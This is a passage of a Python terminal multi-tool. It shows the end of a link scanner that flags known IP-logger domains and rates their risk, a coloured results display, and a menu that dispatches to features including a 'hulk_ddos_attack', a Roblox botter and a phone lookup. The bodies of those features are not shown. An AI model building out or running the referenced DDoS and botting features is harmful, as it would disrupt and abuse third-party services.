            'ipgrab.org', 'yip.su', 'ipgrabs.ru', 'ip-tracker.org'
        ]
        
        for malicious_domain in known_malicious_domains:
            if malicious_domain in domain:
                results['critical_threats'].append(f"KNOWN MALICIOUS DOMAIN: {malicious_domain}")
                results['threats_found'] += 3
        
        # ==================== FINAL RISK CALCULATION ====================
        
        total_score = results['threats_found']
        
        if total_score >= 8:
            results['risk_level'] = 'CRITICAL'
        elif total_score >= 5:
            results['risk_level'] = 'HIGH'
        elif total_score >= 3:
            results['risk_level'] = 'MEDIUM'
        elif total_score >= 1:
            results['risk_level'] = 'LOW'
        else:
            results['risk_level'] = 'CLEAN'
        
        results['scan_score'] = total_score
            
    except Exception as e:
        results['warnings'].append(f"Analysis error: {str(e)}")
    
    return results

def display_ultimate_link_scan_results(results, url):
    """Display comprehensive ULTIMATE link scan results"""
    print("\n\033[38;5;218m" + "="*80 + "\033[0m")
    print("\033[38;5;210m                    ULTIMATE LINK SCAN RESULTS\033[0m")
    print("\033[38;5;218m" + "="*80 + "\033[0m")
    
    risk_colors = {
        'CLEAN': '\033[38;5;46m',
        'LOW': '\033[38;5;118m',
        'MEDIUM': '\033[38;5;214m',
        'HIGH': '\033[38;5;208m',
        'CRITICAL': '\033[38;5;196m',
        'UNKNOWN': '\033[38;5;240m'
    }
    
    color = risk_colors.get(results['risk_level'], '\033[38;5;240m')
    
    print(f"\033[38;5;228mURL: \033[38;5;218m{url}\033[0m")
    print(f"\033[38;5;228mFinal Destination: \033[38;5;218m{results['final_destination']}\033[0m")
    print(f"\033[38;5;228mRisk Level: {color}{results['risk_level']}\033[0m")
    print(f"\033[38;5;228mThreat Score: \033[38;5;218m{results['scan_score']}/20\033[0m")
    print(f"\033[38;5;228mTotal Threats Found: \033[38;5;218m{results['threats_found']}\033[0m")
    
    if results['ip_address']:
        print(f"\033[38;5;228mIP Address: \033[38;5;218m{results['ip_address']}\033[0m")
    
    if results['geolocation']:
        print(f"\033[38;5;228mServer Location: \033[38;5;218m{results['geolocation']}\033[0m")
    
    # Display critical threats
    if results['critical_threats']:
        print(f"\n\033[38;5;196m🔥 CRITICAL THREATS ({len(results['critical_threats'])})\033[0m")
        for threat in results['critical_threats']:
            print(f"  \033[38;5;196m• {threat}\033[0m")
    
    # Display high threats
    if results['high_threats']:
        print(f"\n\033[38;5;208m🔺 HIGH THREATS ({len(results['high_threats'])})\033[0m")
        for threat in results['high_threats']:
            print(f"  \033[38;5;208m• {threat}\033[0m")
    
    # Display medium threats
    if results['medium_threats']:
        print(f"\n\033[38;5;214m⚠️  MEDIUM THREATS ({len(results['medium_threats'])})\033[0m")
        for threat in results['medium_threats']:
            print(f"  \033[38;5;214m• {threat}\033[0m")
    
    # Display low threats
    if results['low_threats']:
        print(f"\n\033[38;5;228m📝 LOW THREATS ({len(results['low_threats'])})\033[0m")
        for threat in results['low_threats']:
            print(f"  \033[38;5;228m• {threat}\033[0m")
    
    # Display redirects
    if results['redirects']:
        print(f"\n\033[38;5;196m🔄 REDIRECTS DETECTED:\033[0m")
        for redirect in results['redirects']:
            print(f"  \033[38;5;196m• {redirect}\033[0m")
    
    if results['warnings']:
        print(f"\n\033[38;5;228m📝 WARNINGS:\033[0m")
        for warning in results['warnings']:
            print(f"  \033[38;5;228m• {warning}\033[0m")
    
    # ULTIMATE RECOMMENDATIONS
    print(f"\n\033[38;5;118m🛡️  ULTIMATE SECURITY VERDICT:\033[0m")
    
    if results['risk_level'] == 'CRITICAL':
        print(f"  \033[38;5;196m🚫 EXTREME DANGER - DO NOT VISIT!\033[0m")
        print(f"  \033[38;5;196m• This link is HIGHLY MALICIOUS\033[0m")
        print(f"  \033[38;5;196m• Contains multiple critical security threats\033[0m")
        print(f"  \033[38;5;196m• Likely contains IP loggers, malware, or phishing\033[0m")
        print(f"  \033[38;5;196m• BLOCK AND REPORT THIS LINK IMMEDIATELY\033[0m")
        
    elif results['risk_level'] == 'HIGH':
        print(f"  \033[38;5;208m⚠️  HIGH RISK - AVOID VISITING!\033[0m")
        print(f"  \033[38;5;208m• Multiple security threats detected\033[0m")
        print(f"  \033[38;5;208m• Potential IP logging or malware distribution\033[0m")
        print(f"  \033[38;5;208m• Use extreme caution if you must visit\033[0m")
        
    elif results['risk_level'] == 'MEDIUM':
        print(f"  \033[38;5;214m🔶 MEDIUM RISK - BE CAREFUL!\033[0m")
        print(f"  \033[38;5;214m• Some suspicious elements detected\033[0m")
        print(f"  \033[38;5;214m• Use VPN and ensure antivirus is active\033[0m")
        print(f"  \033[38;5;214m• Do not enter any personal information\033[0m")
        
    elif results['risk_level'] == 'LOW':
        print(f"  \033[38;5;118m🔸 LOW RISK - RELATIVELY SAFE\033[0m")
        print(f"  \033[38;5;118m• Minor suspicious elements detected\033[0m")
        print(f"  \033[38;5;118m• Proceed with normal caution\033[0m")
        
    else:
        print(f"  \033[38;5;46m✅ CLEAN - NO THREATS DETECTED\033[0m")
        print(f"  \033[38;5;46m• Link appears safe based on current analysis\033[0m")
        print(f"  \033[38;5;46m• Always remain vigilant online\033[0m")
    
    print("\033[38;5;218m" + "="*80 + "\033[0m")

def handle_menu_selection(choice):
    if choice == '1':
        get_ip_info()
    elif choice == '2':
        get_my_ip()
    elif choice == '3':
        ip_generator()
    elif choice == '4':
        hulk_ddos_attack()
    elif choice == '5':
        advanced_alt_checker()
    elif choice == '6':
        virus_scanner()
    elif choice == '7':
        network_scanner()
    elif choice == '8':
        phone_lookup()  # This is the new Phone Lookup feature
    elif choice == '9':
        roblox_botter()  # This is the new RobloxBotter feature
    elif choice in ['10','11','12','13','14']:
        clear_screen()
        print(f"\n\033[38;5;228mOption {choice} function selected\033[0m")
        input("\033[38;5;228mPress G to go back...\033[0m")
    elif choice == '15':
        clear_screen()
        print("\n\033[38;5;228mExiting...\033[0m")
        time.sleep(1)
        return True
    else:
        clear_screen()
        print("\n\033[38;5;196mInvalid option. Please select 1-15.\033[0m")
        input("\033[38;5;228mPress G to go back...\033[0m")
    return False

# ============================ MAIN PROGRAM WITH LOGIN ============================

def main():
    """Main program with login system"""
    # Show login screen first
    user_type = admin_login()
    
    # If admin, show admin panel
    if user_type == "admin":
        show_admin_panel()
    
    # Main program loop
    while True:
        show_main_menu()
        try:
            choice = input("\033[38;5;218m> \033[0m").strip()
            should_exit = handle_menu_selection(choice)
            if should_exit:
                break
        except KeyboardInterrupt:
            clear_screen()
            print("\n\033[38;5;228mExiting...\033[0m")
            break
        except Exception as e:
            clear_screen()
            print(f"\n\033[38;5;196mAn error occurred: {e}\033[0m")
            input("\033[38;5;228mPress G to go back...\033[0m")

if __name__ == "__main__":
    main()